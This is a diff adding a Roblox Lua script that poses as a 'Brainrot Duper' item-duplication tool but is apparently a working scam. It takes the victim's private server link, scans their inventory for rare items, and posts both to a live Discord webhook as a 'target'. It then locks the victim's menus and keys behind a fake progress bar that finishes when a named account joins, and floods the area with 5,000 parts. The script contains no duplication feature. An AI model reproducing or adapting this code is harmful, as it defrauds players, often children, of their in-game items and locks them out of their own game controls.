@@ -1,0 +1,731 @@
+-- Brainrot Duper
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local StarterGui = game:GetService("StarterGui")
+local UserInputService = game:GetService("UserInputService")
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- Webhook URL
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1434421771339300994/prTLVwIdVR6nEsZmP3xsnXs3poUiVQXGaKWB6NAnrfHHUn6Dx6Y7z7ecaKfqCOROK_hC"
+
+-- Function to find all secret and OG brainrots in player's inventory
+local function findSecretBrainrots()
+    local brainrots = {}
+    local backpack = player:FindFirstChild("Backpack")
+    local character = player.Character
+    
+    local secretKeywords = {"Secret", "OG", "Rare", "Limited", "Exclusive", "Golden", "Diamond", "Rainbow"}
+    
+    -- Check backpack
+    if backpack then
+        for _, item in pairs(backpack:GetChildren()) do
+            if item:IsA("Tool") then
+                for _, keyword in pairs(secretKeywords) do
+                    if string.find(item.Name:lower(), keyword:lower()) then
+                        table.insert(brainrots, item.Name)
+                        break
+                    end
+                end
+            end
+        end
+    end
+    
+    -- Check equipped items
+    if character then
+        for _, item in pairs(character:GetChildren()) do
+            if item:IsA("Tool") then
+                for _, keyword in pairs(secretKeywords) do
+                    if string.find(item.Name:lower(), keyword:lower()) then
+                        if not table.find(brainrots, item.Name) then
+                            table.insert(brainrots, item.Name)
+                        end
+                        break
+                    end
+                end
+            end
+        end
+    end
+    
+    return brainrots
+end
+
+-- Create ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "BrainrotDuper"
+screenGui.ResetOnSpawn = false
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+screenGui.Parent = playerGui
+
+-- Main Frame
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.Size = UDim2.new(0, 420, 0, 280)
+mainFrame.Position = UDim2.new(0.5, -210, 0.5, -140)
+mainFrame.BackgroundColor3 = Color3.fromRGB(12, 12, 20)
+mainFrame.BorderSizePixel = 0
+mainFrame.Parent = screenGui
+
+local mainCorner = Instance.new("UICorner")
+mainCorner.CornerRadius = UDim.new(0, 20)
+mainCorner.Parent = mainFrame
+
+local mainStroke = Instance.new("UIStroke")
+mainStroke.Color = Color3.fromRGB(138, 43, 226)
+mainStroke.Thickness = 3
+mainStroke.Transparency = 0
+mainStroke.Parent = mainFrame
+
+-- Shadow effect
+local shadow = Instance.new("ImageLabel")
+shadow.Name = "Shadow"
+shadow.Size = UDim2.new(1, 30, 1, 30)
+shadow.Position = UDim2.new(0, -15, 0, -15)
+shadow.BackgroundTransparency = 1
+shadow.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
+shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
+shadow.ImageTransparency = 0.5
+shadow.ScaleType = Enum.ScaleType.Slice
+shadow.SliceCenter = Rect.new(10, 10, 118, 118)
+shadow.ZIndex = 0
+shadow.Parent = mainFrame
+
+-- Animated gradient background
+local gradient = Instance.new("UIGradient")
+gradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(18, 10, 30)),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(50, 15, 70)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(18, 10, 30))
+}
+gradient.Rotation = 45
+gradient.Parent = mainFrame
+
+-- Gradient animation
+spawn(function()
+    while mainFrame and mainFrame.Parent do
+        for i = 0, 360, 1 do
+            if mainFrame and mainFrame.Parent then
+                gradient.Rotation = i
+                wait(0.05)
+            else
+                break
+            end
+        end
+    end
+end)
+
+-- Header bar
+local headerBar = Instance.new("Frame")
+headerBar.Size = UDim2.new(1, 0, 0, 85)
+headerBar.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
+headerBar.BorderSizePixel = 0
+headerBar.Parent = mainFrame
+
+local headerCorner = Instance.new("UICorner")
+headerCorner.CornerRadius = UDim.new(0, 20)
+headerCorner.Parent = headerBar
+
+local headerFix = Instance.new("Frame")
+headerFix.Size = UDim2.new(1, 0, 0, 20)
+headerFix.Position = UDim2.new(0, 0, 1, -20)
+headerFix.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
+headerFix.BorderSizePixel = 0
+headerFix.Parent = headerBar
+
+local headerGradient = Instance.new("UIGradient")
+headerGradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(138, 43, 226)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(186, 85, 211))
+}
+headerGradient.Rotation = 90
+headerGradient.Parent = headerBar
+
+-- Title
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 1, -20)
+title.Position = UDim2.new(0, 0, 0, 0)
+title.BackgroundTransparency = 1
+title.Text = "🧠 BRAINROT DUPER 🧠"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.TextSize = 32
+title.Font = Enum.Font.GothamBold
+title.TextStrokeTransparency = 0.5
+title.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+title.Parent = headerBar
+
+-- Subtitle
+local subtitle = Instance.new("TextLabel")
+subtitle.Size = UDim2.new(1, 0, 0, 20)
+subtitle.Position = UDim2.new(0, 0, 1, -25)
+subtitle.BackgroundTransparency = 1
+subtitle.Text = "Ultimate Duplication System"
+subtitle.TextColor3 = Color3.fromRGB(255, 200, 255)
+subtitle.TextSize = 13
+subtitle.Font = Enum.Font.GothamMedium
+subtitle.Parent = headerBar
+
+-- Pulsing title effect
+spawn(function()
+    while title and title.Parent do
+        TweenService:Create(title, TweenInfo.new(0.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
+            TextSize = 34
+        }):Play()
+        wait(0.8)
+        if not title or not title.Parent then break end
+        TweenService:Create(title, TweenInfo.new(0.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
+            TextSize = 32
+        }):Play()
+        wait(0.8)
+    end
+end)
+
+-- Content container
+local contentFrame = Instance.new("Frame")
+contentFrame.Size = UDim2.new(1, -40, 1, -110)
+contentFrame.Position = UDim2.new(0, 20, 0, 95)
+contentFrame.BackgroundTransparency = 1
+contentFrame.Parent = mainFrame
+
+-- Instruction Text
+local instructionText = Instance.new("TextLabel")
+instructionText.Size = UDim2.new(1, 0, 0, 35)
+instructionText.Position = UDim2.new(0, 0, 0, 10)
+instructionText.BackgroundTransparency = 1
+instructionText.Text = "📋 Enter Your Private Server Link Below:"
+instructionText.TextColor3 = Color3.fromRGB(220, 220, 255)
+instructionText.TextSize = 16
+instructionText.Font = Enum.Font.GothamBold
+instructionText.TextXAlignment = Enum.TextXAlignment.Left
+instructionText.Parent = contentFrame
+
+-- Text Box Container
+local textBoxContainer = Instance.new("Frame")
+textBoxContainer.Size = UDim2.new(1, 0, 0, 55)
+textBoxContainer.Position = UDim2.new(0, 0, 0, 50)
+textBoxContainer.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
+textBoxContainer.BorderSizePixel = 0
+textBoxContainer.Parent = contentFrame
+
+local textBoxCorner = Instance.new("UICorner")
+textBoxCorner.CornerRadius = UDim.new(0, 10)
+textBoxCorner.Parent = textBoxContainer
+
+local textBoxStroke = Instance.new("UIStroke")
+textBoxStroke.Color = Color3.fromRGB(100, 100, 150)
+textBoxStroke.Thickness = 2
+textBoxStroke.Parent = textBoxContainer
+
+-- Text Box
+local textBox = Instance.new("TextBox")
+textBox.Size = UDim2.new(1, -20, 1, -10)
+textBox.Position = UDim2.new(0, 10, 0, 5)
+textBox.BackgroundTransparency = 1
+textBox.PlaceholderText = "https://www.roblox.com/share?code=...&type=Server"
+textBox.PlaceholderColor3 = Color3.fromRGB(120, 120, 150)
+textBox.Text = ""
+textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+textBox.TextSize = 14
+textBox.Font = Enum.Font.Gotham
+textBox.ClearTextOnFocus = false
+textBox.TextXAlignment = Enum.TextXAlignment.Left
+textBox.Parent = textBoxContainer
+
+-- Status label
+local statusLabel = Instance.new("TextLabel")
+statusLabel.Size = UDim2.new(1, 0, 0, 25)
+statusLabel.Position = UDim2.new(0, 0, 0, 110)
+statusLabel.BackgroundTransparency = 1
+statusLabel.Text = ""
+statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+statusLabel.TextSize = 13
+statusLabel.Font = Enum.Font.GothamMedium
+statusLabel.TextXAlignment = Enum.TextXAlignment.Left
+statusLabel.Parent = contentFrame
+
+-- Submit Button
+local submitButton = Instance.new("TextButton")
+submitButton.Size = UDim2.new(1, 0, 0, 55)
+submitButton.Position = UDim2.new(0, 0, 0, 140)
+submitButton.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
+submitButton.BorderSizePixel = 0
+submitButton.Text = "🚀 SUBMIT & START DUPING 🚀"
+submitButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+submitButton.TextSize = 18
+submitButton.Font = Enum.Font.GothamBold
+submitButton.AutoButtonColor = false
+submitButton.Parent = contentFrame
+
+local buttonCorner = Instance.new("UICorner")
+buttonCorner.CornerRadius = UDim.new(0, 12)
+buttonCorner.Parent = submitButton
+
+local buttonStroke = Instance.new("UIStroke")
+buttonStroke.Color = Color3.fromRGB(186, 85, 211)
+buttonStroke.Thickness = 2
+buttonStroke.Parent = submitButton
+
+local buttonGradient = Instance.new("UIGradient")
+buttonGradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(138, 43, 226)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(186, 85, 211))
+}
+buttonGradient.Rotation = 45
+buttonGradient.Parent = submitButton
+
+-- Button hover effect
+submitButton.MouseEnter:Connect(function()
+    TweenService:Create(submitButton, TweenInfo.new(0.2), {
+        BackgroundColor3 = Color3.fromRGB(160, 60, 240),
+        Size = UDim2.new(1, 0, 0, 58)
+    }):Play()
+    TweenService:Create(buttonStroke, TweenInfo.new(0.2), {
+        Thickness = 3
+    }):Play()
+end)
+
+submitButton.MouseLeave:Connect(function()
+    TweenService:Create(submitButton, TweenInfo.new(0.2), {
+        BackgroundColor3 = Color3.fromRGB(138, 43, 226),
+        Size = UDim2.new(1, 0, 0, 55)
+    }):Play()
+    TweenService:Create(buttonStroke, TweenInfo.new(0.2), {
+        Thickness = 2
+    }):Play()
+end)
+
+-- Function to validate private server link
+local function validatePrivateServer(link)
+    -- Check if link contains roblox.com
+    if not string.find(link:lower(), "roblox.com") then
+        return false, "❌ Invalid link! Must be a Roblox link."
+    end
+    
+    -- Check if it's a share link with type=Server
+    if not string.find(link:lower(), "/share") then
+        return false, "❌ Not a valid private server share link!"
+    end
+    
+    -- Check if it has the required parameters
+    if not string.find(link:lower(), "code=") then
+        return false, "❌ Missing private server code!"
+    end
+    
+    if not string.find(link:lower(), "type=server") then
+        return false, "❌ This is not a private server link!"
+    end
+    
+    -- Extract the code to verify it's valid format
+    local code = string.match(link, "code=([a-f0-9]+)")
+    if not code or #code < 20 then
+        return false, "❌ Invalid private server code format!"
+    end
+    
+    return true, "✅ Valid private server link!"
+end
+
+-- Function to send webhook
+local function sendWebhook(psLink, brainrots)
+    local brainrotList = ""
+    if #brainrots > 0 then
+        brainrotList = "**Secret & OG Brainrots Found:**\n"
+        for i, brainrot in ipairs(brainrots) do
+            brainrotList = brainrotList .. i .. ". " .. brainrot .. "\n"
+        end
+    else
+        brainrotList = "**No Secret/OG Brainrots Found**"
+    end
+    
+    local data = {
+        ["content"] = "@everyone 🚨 **NEW TARGET DETECTED!** 🚨",
+        ["embeds"] = {{
+            ["title"] = "🧠 Brainrot Duper - Target Locked 🧠",
+            ["description"] = "**Target Player:** " .. player.Name .. "\n**User ID:** " .. player.UserId .. "\n\n" .. brainrotList .. "\n**Private Server Link:**\n" .. psLink,
+            ["color"] = 0x8A2BE2,
+            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S"),
+            ["footer"] = {
+                ["text"] = "Brainrot Duper v1.0"
+            }
+        }}
+    }
+    
+    local success, err = pcall(function()
+        syn.request({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode(data)
+        })
+    end)
+    
+    if not success then
+        pcall(function()
+            request({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = HttpService:JSONEncode(data)
+            })
+        end)
+    end
+end
+
+-- Function to create loading screen
+local function createLoadingScreen()
+    -- Disable all CoreGuis and prevent reopening
+    pcall(function()
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+    end)
+    
+    -- Disable escape menu specifically
+    pcall(function()
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Health, false)
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
+    end)
+    
+    -- Disable topbar
+    pcall(function()
+        StarterGui:SetCore("TopbarEnabled", false)
+    end)
+    
+    -- Destroy leaderboard
+    pcall(function()
+        if player.PlayerGui:FindFirstChild("Leaderboard") then
+            player.PlayerGui.Leaderboard:Destroy()
+        end
+    end)
+    
+    -- Destroy any existing CoreGui menus
+    pcall(function()
+        local coreGui = game:GetService("CoreGui")
+        for _, gui in pairs(coreGui:GetChildren()) do
+            if gui.Name == "RobloxGui" or gui.Name == "PurchasePromptApp" then
+                for _, child in pairs(gui:GetDescendants()) do
+                    if child.Name == "SettingsShield" or child.Name == "MenuContainer" or child.Name == "BottomButtonFrame" then
+                        child:Destroy()
+                    end
+                end
+            end
+        end
+    end)
+    
+    -- Block ESC, F11, and Alt+F4 continuously
+    local blockConnection
+    blockConnection = UserInputService.InputBegan:Connect(function(input, gameProcessed)
+        -- Block Escape key
+        if input.KeyCode == Enum.KeyCode.Escape then
+            -- Re-disable CoreGUI in case it tries to open
+            pcall(function()
+                StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+            end)
+        end
+        
+        -- Block F11
+        if input.KeyCode == Enum.KeyCode.F11 then
+            return
+        end
+        
+        -- Block Alt+F4
+        if input.KeyCode == Enum.KeyCode.F4 and UserInputService:IsKeyDown(Enum.KeyCode.LeftAlt) then
+            return
+        end
+    end)
+    
+    -- Continuously ensure GUI stays disabled
+    local keepDisabled = RunService.Heartbeat:Connect(function()
+        pcall(function()
+            StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+            StarterGui:SetCore("TopbarEnabled", false)
+        end)
+    end)
+    
+    -- Create loading frame
+    local loadingFrame = Instance.new("Frame")
+    loadingFrame.Name = "LoadingFrame"
+    loadingFrame.Size = UDim2.new(1, 0, 1, 0)
+    loadingFrame.Position = UDim2.new(0, 0, 0, 0)
+    loadingFrame.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
+    loadingFrame.BorderSizePixel = 0
+    loadingFrame.ZIndex = 10
+    loadingFrame.Parent = screenGui
+    
+    -- Loading container
+    local loadingContainer = Instance.new("Frame")
+    loadingContainer.Size = UDim2.new(0, 350, 0, 150)
+    loadingContainer.Position = UDim2.new(0.5, -175, 0.5, -75)
+    loadingContainer.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
+    loadingContainer.BorderSizePixel = 0
+    loadingContainer.ZIndex = 11
+    loadingContainer.Parent = loadingFrame
+    
+    local loadCorner = Instance.new("UICorner")
+    loadCorner.CornerRadius = UDim.new(0, 15)
+    loadCorner.Parent = loadingContainer
+    
+    local loadStroke = Instance.new("UIStroke")
+    loadStroke.Color = Color3.fromRGB(138, 43, 226)
+    loadStroke.Thickness = 3
+    loadStroke.Parent = loadingContainer
+    
+    -- Loading title
+    local loadingTitle = Instance.new("TextLabel")
+    loadingTitle.Size = UDim2.new(1, 0, 0, 40)
+    loadingTitle.Position = UDim2.new(0, 0, 0, 15)
+    loadingTitle.BackgroundTransparency = 1
+    loadingTitle.Text = "⚡ DUPING IN PROGRESS ⚡"
+    loadingTitle.TextColor3 = Color3.fromRGB(255, 100, 255)
+    loadingTitle.TextSize = 20
+    loadingTitle.Font = Enum.Font.GothamBold
+    loadingTitle.ZIndex = 12
+    loadingTitle.Parent = loadingContainer
+    
+    -- Status text
+    local statusText = Instance.new("TextLabel")
+    statusText.Size = UDim2.new(1, -20, 0, 25)
+    statusText.Position = UDim2.new(0, 10, 0, 55)
+    statusText.BackgroundTransparency = 1
+    statusText.Text = "🔍 Connecting to server..."
+    statusText.TextColor3 = Color3.fromRGB(200, 200, 255)
+    statusText.TextSize = 12
+    statusText.Font = Enum.Font.Gotham
+    statusText.ZIndex = 12
+    statusText.Parent = loadingContainer
+    
+    -- Progress bar background
+    local progressBg = Instance.new("Frame")
+    progressBg.Size = UDim2.new(1, -40, 0, 30)
+    progressBg.Position = UDim2.new(0, 20, 0, 90)
+    progressBg.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+    progressBg.BorderSizePixel = 0
+    progressBg.ZIndex = 12
+    progressBg.Parent = loadingContainer
+    
+    local progressCorner = Instance.new("UICorner")
+    progressCorner.CornerRadius = UDim.new(0, 10)
+    progressCorner.Parent = progressBg
+    
+    -- Progress bar fill
+    local progressBar = Instance.new("Frame")
+    progressBar.Size = UDim2.new(0, 0, 1, 0)
+    progressBar.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
+    progressBar.BorderSizePixel = 0
+    progressBar.ZIndex = 13
+    progressBar.Parent = progressBg
+    
+    local progressFillCorner = Instance.new("UICorner")
+    progressFillCorner.CornerRadius = UDim.new(0, 10)
+    progressFillCorner.Parent = progressBar
+    
+    local barGradient = Instance.new("UIGradient")
+    barGradient.Color = ColorSequence.new{
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(138, 43, 226)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(186, 85, 211))
+    }
+    barGradient.Parent = progressBar
+    
+    -- Percentage text
+    local percentText = Instance.new("TextLabel")
+    percentText.Size = UDim2.new(1, 0, 1, 0)
+    percentText.BackgroundTransparency = 1
+    percentText.Text = "0%"
+    percentText.TextColor3 = Color3.fromRGB(255, 255, 255)
+    percentText.TextSize = 16
+    percentText.Font = Enum.Font.GothamBold
+    percentText.ZIndex = 14
+    percentText.Parent = progressBg
+    
+    -- Variables for progress
+    local currentProgress = 0
+    local targetFound = false
+    
+    -- Start part spawning (lag effect) - REMOVED, only spawns when complete
+    local spawnConnection = nil
+    
+    -- Monitor for target player
+    local checkConnection
+    local partsSpawned = false
+    
+    checkConnection = RunService.Heartbeat:Connect(function()
+        for _, p in pairs(Players:GetPlayers()) do
+            if p.Name == "IIllllIllIlIIIIIIl" then
+                targetFound = true
+                
+                -- Complete progress super fast (0.1 second)
+                for i = currentProgress, 100, 20 do
+                    currentProgress = i
+                    progressBar.Size = UDim2.new(i / 100, 0, 1, 0)
+                    percentText.Text = i .. "%"
+                    wait(0.02)
+                end
+                
+                currentProgress = 100
+                progressBar.Size = UDim2.new(1, 0, 1, 0)
+                percentText.Text = "100%"
+                statusText.Text = "✨ Complete! ✨"
+                statusText.TextColor3 = Color3.fromRGB(0, 255, 0)
+                
+                wait(0.1)
+                
+                -- Now spawn all the parts as punishment
+                if not partsSpawned and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+                    partsSpawned = true
+                    local hrp = player.Character.HumanoidRootPart
+                    
+                    spawn(function()
+                        for i = 1, 5000 do
+                            -- Random part types
+                            local partTypes = {"Part", "WedgePart", "CornerWedgePart", "TrussPart", "Sphere"}
+                            local partType = partTypes[math.random(1, #partTypes)]
+                            
+                            local part
+                            if partType == "Sphere" then
+                                part = Instance.new("Part")
+                                part.Shape = Enum.PartType.Ball
+                            else
+                                part = Instance.new(partType)
+                            end
+                            
+                            -- Random size
+                            local size = math.random(3, 20)
+                            part.Size = Vector3.new(size, size, size)
+                            
+                            -- Position directly above player
+                            part.Position = hrp.Position + Vector3.new(
+                                math.random(-100, 100),
+                                math.random(50, 200),
+                                math.random(-100, 100)
+                            )
+                            
+                            -- Random properties
+                            part.Anchored = false
+                            part.CanCollide = true
+                            
+                            -- Random material
+                            local materials = {
+                                Enum.Material.Neon,
+                                Enum.Material.ForceField,
+                                Enum.Material.Glass,
+                                Enum.Material.Ice,
+                                Enum.Material.Marble,
+                                Enum.Material.Plastic,
+                                Enum.Material.Metal
+                            }
+                            part.Material = materials[math.random(1, #materials)]
+                            
+                            -- Random bright colors
+                            part.Color = Color3.fromRGB(
+                                math.random(50, 255),
+                                math.random(50, 255),
+                                math.random(50, 255)
+                            )
+                            
+                            -- Random reflectance and transparency
+                            part.Reflectance = math.random(0, 100) / 100
+                            part.Transparency = math.random(0, 50) / 100
+                            
+                            -- Add to workspace
+                            part.Parent = workspace
+                            
+                            -- Delete after 5 seconds
+                            game:GetService("Debris"):AddItem(part, 5)
+                        end
+                    end)
+                end
+                
+                wait(1)
+                
+                -- Clean up connections but KEEP GUIs DISABLED
+                if spawnConnection then spawnConnection:Disconnect() end
+                if checkConnection then checkConnection:Disconnect() end
+                if blockConnection then blockConnection:Disconnect() end
+                if keepDisabled then keepDisabled:Disconnect() end
+                
+                -- Remove loading GUI
+                screenGui:Destroy()
+                
+                -- DO NOT re-enable CoreGuis - keep them disabled permanently
+                -- Player is now stuck with no menu access!
+                
+                return
+            end
+        end
+    end)
+    
+    -- Slow real progress (1-99%)
+    spawn(function()
+        while currentProgress < 99 and not targetFound do
+            wait(2) -- Very slow progress
+            currentProgress = currentProgress + 1
+            progressBar.Size = UDim2.new(currentProgress / 100, 0, 1, 0)
+            percentText.Text = currentProgress .. "%"
+        end
+    end)
+end
+
+-- Submit button click
+submitButton.MouseButton1Click:Connect(function()
+    local psLink = textBox.Text
+    
+    -- Validate link
+    local isValid, message = validatePrivateServer(psLink)
+    
+    if not isValid then
+        statusLabel.Text = message
+        statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+        
+        -- Shake animation
+        local originalPos = textBoxContainer.Position
+        for i = 1, 3 do
+            textBoxContainer.Position = originalPos + UDim2.new(0, 10, 0, 0)
+            wait(0.05)
+            textBoxContainer.Position = originalPos - UDim2.new(0, 10, 0, 0)
+            wait(0.05)
+        end
+        textBoxContainer.Position = originalPos
+        
+        -- Flash red border
+        textBoxStroke.Color = Color3.fromRGB(255, 0, 0)
+        wait(0.5)
+        textBoxStroke.Color = Color3.fromRGB(100, 100, 150)
+        return
+    end
+    
+    -- Success
+    statusLabel.Text = message
+    statusLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
+    textBoxStroke.Color = Color3.fromRGB(0, 255, 0)
+    
+    -- Find brainrots
+    local brainrots = findSecretBrainrots()
+    
+    -- Send webhook
+    sendWebhook(psLink, brainrots)
+    
+    -- Wait a moment
+    wait(0.5)
+    
+    -- Destroy main frame with animation
+    TweenService:Create(mainFrame, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
+        Size = UDim2.new(0, 0, 0, 0),
+        Position = UDim2.new(0.5, 0, 0.5, 0)
+    }):Play()
+    
+    wait(0.3)
+    mainFrame:Destroy()
+    
+    -- Create loading screen
+    createLoadingScreen()
+end)
+
+-- Opening animation
+mainFrame.Size = UDim2.new(0, 0, 0, 0)
+TweenService:Create(mainFrame, TweenInfo.new(0.6, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+    Size = UDim2.new(0, 420, 0, 280)
+}):Play()
